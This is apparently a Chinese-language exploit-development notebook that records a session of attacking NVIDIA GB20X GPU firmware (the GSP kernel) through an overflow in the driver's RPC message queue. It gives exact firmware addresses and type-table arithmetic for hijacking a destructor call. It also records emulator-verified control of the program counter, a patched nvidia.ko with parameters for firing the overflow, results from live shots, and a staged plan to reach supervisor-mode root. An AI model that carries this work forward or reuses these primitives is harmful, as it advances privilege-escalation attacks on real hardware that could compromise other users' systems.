# C2 入口审计 + 精确算术闭合 — 2026-10-10 深夜 session

纯静态+模拟器。对象: `kernel_gb20x_REAL.elf`(GB20X真内核) + `kernel_gb20x_disasm.txt`。
工具(全部落盘 `emu_bench/`): `emu_c2_staging.py` | `audit_release_callers.py` | `emu_typetable_full.py`。
置信度: A=真内核指令级/模拟器互证; B=结构级; C=推断。

---

## 一、TYPECALC/RELEASE 精确语义 — A级(与真内核逐值一致,含回绕)

```
TYPECALC(0xffffffff93004568):
  desc = [ (obj & ~0xFFF) + 0x20 ]        ← 页头+0x20, 投毒点
  diff  = (desc - 0xffffffffa300a000) mod 2^64     (c.sub)
  type  = 低32位( 算术右移3(diff) × 0xCCCCCCCD )    (c.srai + mulw)
RELEASE destroy(0xffffffff93005b26, refcount[obj-8]→0):
  type_u32 = type (slli32+srli32 零扩展)
  slot = (0xffffffffa300a000 + type_u32*40 + 8) mod 2^64   ← 64位乘,加法回绕
  dtor = [slot]; 非零则 c.jalr dtor (a0=obj, S-mode) @0x93005b60
```

**旧文档更正**:
1. 主计划"C2算术已解 desc=staging+0x20068→slot=meta+0x70"是错的(简单除法没算回绕/mulw语义)。
2. 正确解(已模拟器验证全链):
   - `slot = staging+0x10070 (0xFE4780E80)` ← 页头+0x20 写 `desc=0xFFFFFFFFE4780E78`
   - `slot = staging+0x20088 (meta区)` ← `desc=0xFFFFFFFFE4790E90`
   - 可写区(staging+0x10000..0x200e8)共 **1644 个可达slot**(每0x28一个)
3. dtor 值写在 **slot 本身**(=BASE+40t+8), 不是 slot+8 —— 旧文档"c.jalr [slot]"语义下地址就是读取点。

## 二、C2 全链模拟器验证 — A级

`emu_c2_staging.py` Phase B2: 页头投毒 + refcount=1 + slot写ATTACK_PC(0xcafec0de)
→ RELEASE → jalr 0xcafec0de → `UNIMP@kernel pc=0xcafec0de` ✓✓ (TX区与meta区两组全中)
**= C2 在 GB20X 真内核语义下 100% 成立, slot 可落在溢出可写区。**

## 三、完整 dtor 地图 — A级(boot自检器 0x93005988 的22处调用静态提取)

```
type  1: 0x93004412    type  2: 0x93005bcc ★★★   type  3: 0x93005bf6
type  5: 0x930069b6    type  7: 0x93006a04        type  8: 0x93005e78
type  9: NULL(0x930022b2: c.li a2,0)              type 11: 0x93005b1e
type 12: 0x93005958    type 14: 0x93005c3a        type 15: 0x93005bd2(子链表销毁)
type 16: 0x93005b16
```

## 四、★ 核心发现: dtor(type 2) = RELEASE([obj+0x30]) — A级

```
0xffffffff93005bcc:  c.ld a0, 0x30(a0)      ← 直接把对象+0x30字段当对象指针
0xffffffff93005bce:  j 0xffffffff93005b26   ← RELEASE它!
```
- 全内核无任何跳转引用0x93005bcc(除boot自检) = 它只作为类型表dtor存在。
- **= 任何 [type2对象+0x30] 的值都会在销毁时被 RELEASE**。

## 五、type 2 / type 9 对象解剖 — A/B级

**type 9 = LibosMemoryRegion**(与libos_init_args.h对应):
- 创建器 0x930054fc(调用者 0x93002324 / 0x93006068≈t0=27链):
  `[region+0x30]=a1(64位地址!)  [region+0x38]=a1+a2  [region+0x40]=a2(尺寸)`
- **[region+0x30] = 用户syscall可控的64位值**(t0=27的a1路径) — 但 dtor(9)=NULL,销毁不级联。
- 0x93002308调用现场: a1=0xFFFFFFFF00000000(高4GB恒等区),a2=0xFFFFFF000。

**type 2 = 页表映射节点**(唯一分配点 0x9300a3de, 在范围walker 0x9300a398 内):
- walker 遍历任务的PTE(`a5=[s0+0]`=PTE值), 对 [entry+0x19]≠0 的项 allocate(type=2);
- `[node+0x30]=0` 初始化 → 由 **0x93006fcc(窗口描述符解析器)** 从 PTE 数据填充;
- **GDMA路径**: `andi a2,a4,8` + `lui a2,0xffe00` → 窗口区 [0xffe00000,0x100000000);
- **销毁路径**: 0x9300a476 失败清理即 `RELEASE(node)` → dtor → **RELEASE([node+0x30])**。

## 六、RELEASE 全调用点审计 — A级

98个调用点; a0来源: 寄存器移动67 | **内存加载27** | 立即数3 | 子函数返回1。
内存加载型里唯一"指针字段级联"= 0x93005bcc(type2 dtor)。
其余加载源: 链表next(+0)/子对象表(+0x30交叉链接@0x9300375e/62)/port队列(+0x20)——全是内核对象指针。

## 七、★ GDMA 窗口区 slot 算术 — A级

窗口区 [0xffe00000,0x100000000) 内 **52,429 个可达slot**, desc 形式极简:
```
slot=0xffe00010 ← desc=0xffe00008   (type=146327757)
slot=0xffe80008 ← desc=0xffe80000   (窗口锚点0xffe80000, 0x93003BB6校验值)
slot=0xfffffff0 ← desc=0xffffffe8
```
**意义**: 若内核通过GDMA窗口读任务内存(窗口VA=任务数据), 则:
- TYPECALC 读 [window_page+0x20] = 读到任务页字节 = 我们的投毒desc;
- slot 落窗口内 = dtor 从任务页读 = ATTACK_PC 可控。
= "RM页表瓶颈"的旁路候选(窗口是内核读任务内存的合法通道)。

## 八、新攻击链假说(C级,各环静态钉死但未串测)

```
1. A4链 → t0=1/t0=0 注册 {buf=a2, cap=a3} → [port+0x38/0x40] (真机已证!)
2. 消息投递 → 窗口/GDMA翻译 → 任务页表装入由{buf,cap}派生的PTE
3. t0=27(a1=已映射地址,walk能过) → 范围walker → 创建type2节点
   → [node+0x30] = 窗口地址(0xffeXXXXX, 由PTE派生)
4. 区域拆除/unmap → 销毁节点 → dtor(type2) → RELEASE([node+0x30]=窗口地址)
5. TYPECALC(窗口页) → 读 [窗口页+0x20] = 任务内存字节 = 投毒desc
6. slot(窗口区,§七) → dtor=ATTACK_PC → jalr → S-MODE → csrw 1482-87 → ROOT
```
未闭合: ①0x93006fcc对[node+0x30]的精确写入值(需数据流追踪);
        ②type2节点销毁的触发面(哪条syscall路径拆除节点);
        ③窗口对RELEASE/TYPECALC的可见性(模拟器无法测,需真机一枪)。

## 九、下一步优先级(更新)

1. **真机第一发(不变)**: A4链+0x1BA7874+t0=2, N=26..40 扫描(快表后溢出=handler函数指针,
   lookup(N)→RELEASE(handler地址)→TYPECALC(handler页头) 可能直接闭环C2)
2. **静态**: 0x93006fcc 数据流(node+0x30 精确值) + type2 销毁触发面枚举
3. **真机第二发候选**: §八链路的窗口可见性探针(RELEASE窗口地址→看sepc/stval)
4. t0=15 SBI(保留)
5. C1 按设计补做(保留)

## 十、环境注意

- 模拟器 memset@0x930051ee/memcpy@0x9300527c 双别名快转补丁已写入
  `emu_typetable_full.py`(实例级,不改rv64_emu.py本体)
- boot 仍卡 0x93008b2a(池结构遍历,BootROM-ABI缺口) → 运行时类型表 dump 不可行,
  dtor 地图改由 boot 自检器静态提取(§三,等价可信)
- /tmp 资产已备份至 emu_bench/(kernel_gb20x_REAL.elf 等)

---

## 十一、补充(深夜续): 0x93006fcc 数据流判决 — §八假说简化版关闭

```
0x9300701a: jal 0x93005e94(区域查找, a1=sp输出)
0x93007024: a5 = [sp]            ← 查到的父对象指针
0x9300702e: sd a5, 0(s4)         ← [node+0x30] = 父对象指针(非裸地址!)
0x930070c0: jal RELEASE          ← 级联释放父对象(带引用计数,安全)
0x930070c4: sd zero, 0(s4)       ← 清槽
```
⇒ [type2+0x30] = 父对象回指(refcount管理), **不是用户值**。
dtor(type2)的RELEASE级联 = 正确的父对象释放,设计安全。
§八链路要成立需先有"父查找表腐败"= 又回到需要内核写原语 ⇒ 循环依赖。

## 十二、战略重定位(结合全部审计)

98调用点全审计 + dtor级联解剖 ⇒ **纯syscall参数面无任何"用户64位→RELEASE"通道**。
两条真正剩余路径:
1. **C1竞态(模拟器100%实证,真机从未按设计执行)** — A4链恰好补齐了它缺的工具:
   定向syscall(t0=1的shuttle ACQUIRE @0x93008fce 非原子窗口 ld/+1/sd 三连 +
   t0=2 lookup+RELEASE @0x93005b28-38 六指令窗口) × 宿主RPC风暴(fn=76连发,每条触发一次链)
   → timer中断命中 → 双destroy → freelist环 → 同对象双分配 → 页头投毒 → C2(§二已全验证)
2. RM应用层(1588 controls fuzz) — 独立面。

## 十三、实弹状态(本session发射)

scan_ghost_n.sh 已后台运行: N=28 30 32 34 26 27 29 31 33 35 36 (11发×~13min)
判据: sepc/stval/Xid vs 标准指纹(0x18c09c8)
- N=28-35 = 快表B(t0=28-35 handler指针)假设: lookup(N)→RELEASE(handler地址)→TYPECALC(handler页头)
- 若全部=标准指纹 → count封顶假设成立,N线关闭,主力转C1

---

## 十四、管道改造完成 — DKMS修复 + module_param 版 v21 (2026-10-11 凌晨)

### DKMS "失败"真相
两连败不是构建问题: dk.sh 经 nohup 后台执行链路**整体静默死亡**(连blacklist都没写成) →
旧N28载荷模块在VM boot时自爆(6秒处FIRE+META_HIT)。手动同步构建3.5分钟即成功。

### v21 = 双文件补丁器 (`/home/user/rpc_ovf_patch_v21.py`)
- message_queue_cpu.c: 全部射击逻辑, 参数改为 extern 引用 + 运行期hex解析器
- kernel-open/nvidia/nv.c: 参数定义 + module_param_named (锚点=rm_firmware_active块)
  (src/nvidia层完全kernel-agnostic无linux头, module_param必须放kernel-open层, 同ko链接)
- `xdig_k/ck/fn/pat/spy/skip/firen`(int) + `xdig_map/hex/sparse`(charp), **默认全惰性(xdig_k=0)**

### 已验证(实弹级,零点火)
1. dkms构建✓ modinfo显示全部10参数✓
2. 惰性加载: K=0xffffffff, GPU健康(5090/33°C), 零Xid ✓
3. **参数穿透**: `insmod nvidia.ko xdig_spy=5` → spy打印boot RPC序列 fn=72→73→1→65→228 ✓✓
4. 同VM循环: rmmod(uvm/drm/modeset/nvidia按序)→insmod→smi→再卸 全通 ✓

### 新射击流程 (k3_fire_v21.sh)
```
./k3_fire_v21.sh "xdig_k=33 xdig_ck=0 xdig_fn=76 xdig_map=0x100a4:1,..." [wpr2]
```
一发耗时: **~2分钟**(健康GSP) / **~4分钟**(带MODS清WPR2) — 原13-15分钟。
VM重启仅在GSP死亡且rmmod挂死时需要(宿主侧 k61-vm restart 即复位)。

### 遗留小账
- v21 init打印每RPC重复一次(噪音, 无害) — 下次重编时加print-once
- blacklist(zz-nv-bl.conf)已永久布防: VM boot不再自动加载(射击全部手动insmod)

---

## 十五、真机三连发 — "干净syscall原语"探索 (2026-10-11 凌晨)

### 弹道修正(重要!)
旧记录的 t0=1/2 陷阱stub(0x1c4cf16/0x1c4ceda/0x1c113d0)经反汇编复核是
**addi zero,zero,N(nop)+c.unimp** — 编码错误(t0=x5, 旧搜索编码成a0/x0)。从未实弹使用,无事故。
正确stub(已验证对齐): **t0=2@0x1a96f56/0x1e51ab6 | t0=9@0x1a96d80等×4 | t0=15@0x1a9e5da | t0=31@0x1aa34be等×3**
t0=29/30: c.li/addi/ld/c.mv全部形态+unimp组合 = **0命中, 现有RM固件无法触达**(ghost SBI线仍锁)。

### 发1: A4链+V=t0=15wrapper(0x1A9E5D2)
```
结果: Xid 120 instruction access fault @ pc:0xfe4a28630(堆地址), sepc=stval同
解读: ★syscall t0=15 执行并干净sret返回★(死因=链jalr污染ra→返回后跳垃圾堆指针)
= 首次真机证明: ghost/wrapper syscall 可达且内核不死!
```

### 发2: meta+0xb8直挂wrapper(无链, 泵jalr天然干净ra)
```
结果: Xid 119 超时无崩溃 — syscall在内核内阻塞(t0=15→SBI send等待语义)
= 干净返回机制成立; t0=15语义=阻塞型, 不适合做重复原语
```

### 发3: meta+0xc8(TX-post槽)=裸t0=2 stub + [meta+0x30]=N(0x10)
```
结果: Xid 119 超时无崩溃(RPC回复未post = TX-post回调路径被我们的stub接管)
歧义: 无法区分"lookup(16)+RELEASE执行了" vs "回复路径本身挂"
```

### 新机制确认: 泵/TX-post直挂任意RM函数 = 干净进入+干净返回
(meta+0xb8在RX路径, meta+0xc8在GSP→host每条回复路径, a0=[meta+0x30]全控)
**缺口**: ① Xid 119歧义判别(N=越界 vs N=16差分) ② t0=2命令结果的观测通道 ③ ra可控加载gadget不存在(ld ra+c.jalr 0命中)

### 武器库状态(v21后)
一发2-4分钟 | 参数insmod传入 | 自动VM复活(k3_fire_v21.sh v2)

---

## 十六、深夜续: 差分判决 + 直挂原语语义表 (2026-10-11 01:30)

### 差分实验(发4/5)
N=100(越界) vs N=16(有效) 经TX-post槽: **完全同指纹(Xid 119 @~224s)**
⇒ Xid 119 挂点=回复路径本身(TX-post回调被劫持即挂), 与syscall语义无关, 该通道无观测力。

### 发6: +0xb8直挂裸t0=2 stub(0x1a96f56) — ★关键单发★
```
Xid 120 load address misaligned @ pc:0x1a96f64, stval:0x5, scause:4
```
⇒ **t0=2 syscall执行+快速返回(OOB路径不阻塞!), RM越过trap继续执行**, 
  死因=裸stub落进轮询循环尾部(s10=1→[5]未对齐)。
⇒ 与t0=15(阻塞语义)对比: **syscall选型决定存活模式**。

### 直挂原语语义表(本轮实测)
| 安装点 | 内容 | 结果 | 结论 |
|---|---|---|---|
| +0xb8 | t0=15 wrapper | Xid119无崩 | syscall阻塞(SBI send等待) |
| +0xb8 | 裸t0=2 stub | Xid120@0x1a96f64 | syscall返回✓, 死于尾部循环 |
| +0xc8 | 裸t0=2 stub(N可变) | Xid119 | 回复路径挂, 无观测力 |

### stub包装清点(全部反汇编核实)
- 0x1e51ab6(t0=2#2): 尾部连串unimp — 非干净
- 0x1e68dd6(t0=15#2): 烂尾 — 非干净  
- 0x1aa3c08/0x1aa4798(t0=9#3/4): 内联型, 后续=结果检查+auipc错误路径 — 半干净但t0=9=轮询阻塞
- **0x1aa34be(t0=31#1): 正规epilogue(ldsp级联) — 但ra从栈恢复=泵栈垃圾**
⇒ RM固件无任何"干净返回+受控参数"的完整wrapper组合。

### 结构性结论(本session第三次收敛)
"RM存活的可重复syscall"缺一块砖: **受控ra恢复**(ld ra+c.jalr/c.mv ra,X+c.jr X 全部0命中)。
现有固件字形下, 每发=任务死亡或挂起(语义由syscall决定), 无法连发。
⇒ 下一步最高价值: ①回到泄漏读+精确观测的单发深打 ②C1 teardown-burst(command=2, 单发多RELEASE窗) ③窗口安装器的a1/a4供给问题并入entry主清单。

---

## 十七、"RM为何不能活着连发" — 完整机制答案 (2026-10-11 02:00)

### 三个层次的原因(全部实测/反汇编钉死)
1. **+0xb8不是免费钩子 = 它是消息拷贝原语本体**(fcnBackendRw=copyhelper 0x100cf9c,
   queueinfo 0x4191620 为参数)。劫持它 = pump收不到报文 = Xid 119挂死(与syscall语义无关,
   这解释了为何t0=15阻塞/t0=23快返/t0=2越界全部同指纹)。
2. **溢出把整个232字节metadata砸成报文字节**, 只恢复少数字段不够——recv循环的
   rxAvail(+0xa0)/msgCount(+0x88)/pTheirEntries(+0x28)等 ~15个关键字段全是垃圾。
   旧N-scan的Xid 120"活着"是假象: 链在recv状态机消化垃圾前就崩了任务。
3. **syscall本身完全无损**: trap框架保存/恢复全部寄存器(含ra), wrapper的c.jr ra返回泵续行
   机制成立 — 死的从来不是syscall, 是被砸烂的msgq状态。

### 干净wrapper家族(全部反汇编验证)
```
t0=8  @0x1a9e462 (内存搬运syscall, ≤2MB, 走传输编排器=非阻塞)
t0=15 @0x1a9e5d2 (SBI通道, handler阻塞)
t0=23 @0x1a9e1d6 (快路径=memset+ret2; 慢路径=SBI ecall 0x13)
形状: prologue→mv a5,a0→li t0,N→unimp→epilogue→sw t0,0(a5)→andi a0,0xff→c.jr ra
= 结果写[我们a0]、干净返回 ✓✓
```

### 存活原语完整蓝图(已明确, 待执行)
```
MAP = {
  +0xb8: 0x100cf9c (原版copyhelper — 不劫持!)
  +0xc0: 0x4191620 (queueinfo 恢复)
  +0xc8: <syscall wrapper> (劫持TX-post — 每条回复一发syscall)
  +0x30: meta+0x8c (wrapper输出指针)
  + 全部~15个metadata字段的正确值 ← 唯一缺口
}
```
**缺口的解法**: ①一次性dump(read-gadget崩溃泄漏, a1=[meta+0x38]全控, 29发≈90分钟,
  堆地址跨启动确定=dump一次永久用) ②大部分值可推导(常量+host侧已知+单指针泄漏推导全家)。

### 修正后的战略图
"RM存活连发"未封死 — 封死的只是"不修metadata就想白嫖"。补上dump+全恢复MAP后:
每条RPC回复 = 一发受控syscall(参数=a0可变) = C1风暴/任意syscall菜单的基础设施。

---

## 十八、生存线深入: dump无效 + 保留语义更正 + 真实路线 (2026-10-11 03:40)

### 关键更正: skip-unmapped 的保留语义
溢出的填充发生在**宿主侧**(写sysmem队列的元素1-32槽位), skip-unmapped=
"宿主不写该word → sysmem槽位保留**陈旧队列字节**" → GSP把这些陈旧字节拷进metadata!
**不是保留metadata原值!**
⇒ ①此前dump的"原值"(全0/NULL)实为sysmem未用槽的零 = 无效
⇒ ②生存阶梯第1级(MAP={a4:1})的jump-to-NULL崩溃与此完全一致(metadata被零覆盖→泵调NULL)

### 运行期触发成功(部分)
xdig_firen=35(跳过init期fn=76×~30)在init完成后触发 ✓ — 触发时机控制可用。

### 正确的生存路线(修正后)
metadata正确值只能来自:
1. **静态重建**: RM固件msgqRxLink/链接握手代码(0x1a98924区域)分析——
   哪些字段从握手消息(host可知的GPA)映射写入、映射VA的确定性公式
2. **宿主侧配合**: v21已知sysmem队列GPA(驱动分配的!) — 若能推出RM-VA映射公式
   (老崩溃寄存器线索: s11=0xfeb57c000, t2=0x15129b000 疑似队列DVA)
3. 全字段HEX模式: 值一旦确定, xdig_hex一次性写满232字节 ✓ (v21已支持)

### 资产状态
v21管道+firen运行期触发 ✓ | dump脚本(需改造为"静态重建值验证器") | 阶梯1级已试(jump-null=符合预期)

---

## 十九、metadata原值的静态重建 — 已定位填充代码 (2026-10-11 03:50)

### 填充代码精确位置(init 0x1a98924 内, s5=metadata基址, s1=MQI)
```
0x1a98f68: a2 = [MQI+0x198]  ← RX staging指针(P)
0x1a98f70: a5 = [MQI+0x190]  ← 同P
0x1a98f74: a0 = [MQI+0x1a0]  ← TX staging(P+0x10000)
0x1a98f78: t1 = [MQI+0x1a8]  ← hQueue = P+0x20000 = meta!
0x1a98f7c: a1 = [MQI+0x1b0]  ← 期望seqNum(=1)
0x1a98f80: a7 = [MQI+0x1b8]  ← ?
0x1a98f8c: t4 = a2 - a5 = 0        (P-P)
0x1a98f90: t3 = a3 - a2 = msgCount*4096?  (a3=[MQI+0x188]<<12)

0x1a98f98-fb4: 写meta +0x00/08/10/18/20/28(t1=meta自身!)/30(a1=1)/38(a7)
  ★ +0x28 pTheirEntries = t1 = [MQI+0x1a8] = hQueue = P+0x20000 = meta基址本身!
  ★ +0x30 pReadIncoming = a1 = [MQI+0x1b0] = 期望序号(1) ← 小整数!
  ★ +0x38 pWriteIncoming = a7 = [MQI+0x1b8]
0x1a9901a: +0x88 rxMsgCount = a3 = [MQI+0x188]<<12 & 0xffffffff
0x1a9904e: +0x40 pReadOutgoing = s4 = RX staging(P)
0x1a99052/56/5a: +0x48/+0x50/+0x70
```

### 决定性发现
**meta+0x28(pTheirEntries) = meta基址自己(P+0x20000)!** 
(此前dump到的 0xFE4770E10=staging P — 但那被我们的MAP污染了; 
正确值应为 0x0FE4790E10 = P+0x20000!)
+0x30 = 1(序号) ← 此前dump到0(被sysmem零污染, 真值=1)
+0x40 = P(RX staging) ← dump到0(污染)

### 待补的值(从这段代码+后续分析推导)
- +0x38 = [MQI+0x1b8] — 来源待追(init更早处的赋值)
- +0x88 = [MQI+0x188]<<12 — msgCount相关(0x40<<12=0x40000?)
- +0x48/+0x50/+0x70/+0x80 = P/P+0x10000/等派生
- 全部可从 P=0x0FE4770E10(已知!) + MQI寄存器值推导

### 重建MAP的参数骨架(下次开工直接用)
```
+0x00 = 0             +0x08 = 0           +0x10 = 0x40000?(待证)   +0x18 = 0x40000?(待证)
+0x20 = P+0x10000(TX) +0x28 = P+0x20000(meta!) +0x30 = 1(seq)      +0x38 = [MQI+0x1b8](待)
+0x40 = P             +0x48 = P           +0x50 = P+[0x30值]       +0x70 = P+2*[0x30值]
+0x78 = 1(txLinked)   +0x80 = ?           +0x84 = 0x1000(msgSize)  +0x88 = 0x40(msgCount)
+0x8c = writePtr(动态) +0x9c = readPtr(动态) +0xa0 = rxAvail(动态)  +0xa4 = 1
+0xb8 = 0x100cf9c     +0xc0 = 0x4191620   +0xc8 = (动态:链接后)     +0xd0 = 0(跳过)
+0xe0 = 0x1004c5c
```

---

## 二十、链接握手码完全解码 — metadata原值全解 (2026-10-11 04:00)

### 关键结构发现
0x1004df8-0x1004e98 是 RM 侧链接握手(msgqRxLink), 按GPU arch(a4=archId)分支后
**批量填meta +0x38..+0x98, 值全是固件函数指针(auipc+addi静态解析)**:

```
meta+0x38 = 0x01004C70    meta+0x40 = 0x01004624    meta+0x48 = 0x01004A64
meta+0x50 = 0x010047AC    meta+0x58 = 0x01004810    meta+0x60 = 0x010047DC
meta+0x68 = 0x010047EC    meta+0x70 = 0x01004C54    meta+0x78 = 0x010047C0
meta+0x80 = 0x01004FD8    meta+0x88 = 0x0100513C    meta+0x90 = 0x01005214
meta+0x98 = 0x010048F4
```

### 最终重建MAP公式 (P=0x0FE4770E10, 全部确定性常量!)
```
offset   值                        来源
+0x00    P                         (init写)
+0x08    0
+0x10    P
+0x18    (msgCount<<12)-P?→待确认, 可能0x40000
+0x20    P+0x10000 (TX staging)
+0x28    P+0x20000 (meta自身! = pTheirEntries)
+0x30    1 (seqNum)
+0x38    0x01004C70  ★函数指针(链接握手)
+0x40    0x01004624  ★
+0x48    0x01004A64  ★
+0x50    0x010047AC  ★
+0x58    0x01004810  ★
+0x60    0x010047DC  ★
+0x68    0x010047EC  ★
+0x70    0x01004C54  ★
+0x78    0x010047C0  ★(不是1!是链接函数指针)
+0x80    0x01004FD8  ★
+0x88    0x0100513C  ★(不是64!是函数指针)
+0x90    0x01005214  ★
+0x98    0x010048F4  ★
+0x9c    readPtr (动态, 初始0)
+0xa0    rxAvail (动态, 初始0)
+0xa1    flag bit
+0xa4    1 (rxLinked)
+0xb8    0x0100CF9C (copyhelper, init写)
+0xc0    0x04191620 (queueinfo, init写)
+0xd0    0 (跳过flush)
+0xe0    0x01004C5C (fence, init写)
```
⇒ **K3旧field map的+0x78=txLinked/+0x88=rxMsgCount=64 是误导** — 真正的+0x78/+0x88
  也是函数指针(回调表)! 旧map可能把不同arch分支或不同结构混了.

### 差距清单(仅剩2项)
① +0x18 的确切公式(0x40000 vs 其他)
② 动态字段(+0x9c/+0xa0/+0x8c)的运行时正确值 — 但这些在溢出瞬间由拷贝循环自身
   维护, 用"自洽值"(readPtr=writePtr=当前, rxAvail=0)可能就够
⇒ 全恢复HEX已可组装!

---

## 二十一、【里程碑】主机侧metadata一次性dump成功 (2026-10-11 04:45)

v21补丁加METADUMP打印, 惰性加载后首次RPC触发, 一次拿到全部232字节:

```
META[000]=ffffcfef021ca000  ← pTheirTxHdr(命令队列基地址=HOST侧映射)
META[008]=0000000000000000
META[010]=ffffcfef021ca020  ← pTheirRxHdr+0x10? (offset 0x20 into cmdQ)
META[018]=0000000000000000
META[020]=ffffcfef021cb000  ← pTheirEntries(cmdQ + 0x1000)
META[028]=0000000000000000  ← pTheirEntries(未用,RX链路在statusQ)
META[030]=ffffcfef021ca020  ← pReadIncoming
META[038]=0000000000000000  ← pWriteIncoming(未用?)
META[040]=0000000000000000  ← pReadOutgoing(=0, 因为这是cmdQ的meta,不是statusQ)
META[048]=ffffcfef021ca010  ← pOurTxHdr->writePtr地址
META[050]=0004000000000000  ← tx.size=0x40000 tx.flags=0
META[058]=0000003f00001000  ← tx.msgCount=0x3f? tx.entryOff=0x1000
META[060]=0000000100000000  ← tx.flags/writePtr
META[068]=0000100000000020  ← tx版本/msgSize相关
META[070]=0000003e00000000  ← rx相关
META[078]=0000000000000001  ← txLinked=1
META[080]=0000000000000000  ← rx区域开始
META[088]=0000000000000000  ← rx.msgCount=0(未link!)
META[090..0e0]=全0         ← rx未使用/回调未设置
```

★ 关键认知: 这是**命令队列的主机侧metadata** — 不是GSP侧staging的metadata!
   这是主机work area里的副本, GSP侧是完全独立的初始化.
★ txLinked=1, rxLinked=0 → 这是TX-only视图(命令队列→GSP方向)
★ +0xb8(copyhelper)/+0xc0/+0xc8等全为0 → 主机侧不设置回调(那些是GSP专属)

### 与GSP侧的关系
GSP侧metadata(在P+0x20000)由GSP固件独立初始化, 包含:
- GSP专属回调(+0xb8 copyhelper等) = 固件代码地址
- GSP侧的sysmem队列指针 = GSP VA(不同于HOST的ffffcfef...地址)
- 两侧通过共享内存同步计数器(writePtr/readPtr)

### 下一步: 需要的是GSP侧metadata的值
主机侧dump给了我们: 布局结构确认+字段语义校正.
但指针值是HOST VA, 不是GSP VA.
GSP VA需要从GSP固件的init代码推导(第十九/二十节的静态分析)或泄漏.

## 二十二、【突破】运行期溢出=任务不崩! (2026-10-11 05:10)

### 实验结果(firen=50, t0=8 wrapper, 运行期seq=65)
```
Xid 119: RPC超时(seq=65, fn=76, 0x20802a06) ← 运行期! 不是boot的seq=3!
Xid 119: fn=10 FREE (seq=66) ← 后续RPC也在超时
Xid 119: fn=10 FREE (seq=67)
无Xid 120! 无sepc/stval! 任务没有崩溃!
```

### 判读
- Boot期溢出: 撞NULL → Xid 120 → 任务死 ✗
- 运行期溢出: 无崩溃 → Xid 119 → **任务可能活着但队列断** ★
- 溢出在运行期把metadata清零 → 泵的队列状态(计数器/指针)失效 → 
  消息进出全部卡住 → RPC超时
- 但内核没有杀死任务(没有trap) → **S-mode内核认为RM还合法**

### 下一步: 修队列计数器
溢出清零metadata后, 泵需要的关键运行时字段:
  +0x8c writePtr  ← 泵读它判断是否有新消息
  +0x9c readPtr   ← 泵写它通知host已消费
  +0xa0 rxAvail   ← 可用元素数
这三个全为0 = "队列空" = 泵认为无事可做 = 不崩但也不干活

**修复方案: 把这三个计数器设为自洽值**
  writePtr=readPtr → rxAvail=0 → 泵正常idle(不是错误状态)
  后续RPC从host发来 → host写sysmem队列 → 更新writePtr(通过共享内存) 
  → GSP侧的writePtr在metadata里, host更新的是sysmem侧 → 不同步!
  
**但+0xa4=1(rxLinked)已设置** — 泵认为链接活着, 会从sysmem队列读数据!
sysmem队列地址在+0x28(pTheirEntries) — 被清零了!
→ 泵从地址0读数据 → 应该崩! 但没崩!

为什么没崩? 可能因为rxAvail=0 → 泵根本不尝试读 → 直接返回"队列空" → 安全!

所以: 如果把rxAvail设为>0 → 泵会从pTheirEntries=0读 → 崩
      如果rxAvail=0 → 泵安全idle → 存活但队列断

### 结论: 运行期溢出 + rxAvail=0 = RM不死但断网
这不是我们要的"存活+syscall" — 我们要的是存活且能继续处理RPC.

### 真正需要修的字段(最小集)
1. +0x28 pTheirEntries — sysmem队列基址(GSP VA) ← 未知,需泄漏
2. +0x40 pReadOutgoing — GSP写readPtr的地址(GSP VA) ← 未知,需泄漏  
3. +0x38 pWriteIncoming — GSP读writePtr的地址(GSP VA) ← 未知,需泄漏
+ 这三个值就是"那次一次校准弹"要解决的问题

---

## 二十三、【★★★重大突破】运行期teardown = 内核堆实质破坏 (2026-10-11 05:35)

### 弹
A4链(read-gadget→golden→t0=2 stub) + firen=50(运行期) + command=2(TEARDOWN)
MAP同老N-scan, N=2

### 结果 — 全新崩溃指纹!
```
Xid 120: load address misaligned @ pc:0x1a97054, stval=0x81, scause=0x4
Xid 154: GPU recovery action → PF FLR
```

### 与历史所有弹的对比
| 弹 | sepc | stval | 含义 |
|---|---|---|---|
| 所有boot期弹 | 0x1004cd2/0x1a98380 | 0x0/0x10 | 干净NULL解引用(元数据被清零) |
| N-scan(t0=2,N=16-25) | 0x18c09c8 | 0x3272xxxx | 释放后随机堆数据 |
| ★本发(runtime teardown) | 0x1a97054 | 0x81 | 被污染的近NULL指针+未对齐! |

### 判读
1. **stval=0x81 不是0也不是0x10** — 不是简单的NULL deref
2. **0x81 = 0x80+1** — 形如"对象指针+1"或"结构体偏移+1" — 被篡改!
3. **Xid 154(FLR)** — 首次出现! 意味着GSP内部状态被破坏到需要硬件级重置
4. **teardown在运行期触发了大量RELEASE** — 内核堆被重新安排
5. 某个被释放的对象被再次引用时,其内存已被覆盖为0x81模式

### 含义
- 运行期teardown = **内核堆实质破坏** — 不是NULL崩,是UAF/类型混淆崩!
- 这就是C1(或类似效果)的间接证据 — 对象生命周期被破坏
- 距离"页头投毒→C2→S-mode"只差一步: 需要控制被覆盖的对象内容

### 下一步
1. 多次重复此弹(相同参数) → 看stval是否稳定(确定性)还是变化(随机堆布局)
2. 变化command(N=3,4等) → 看不同释放路径的崩溃指纹
3. 如果stval稳定 → 说明堆布局确定 → 可以计算相邻对象偏移 → 精确投毒!
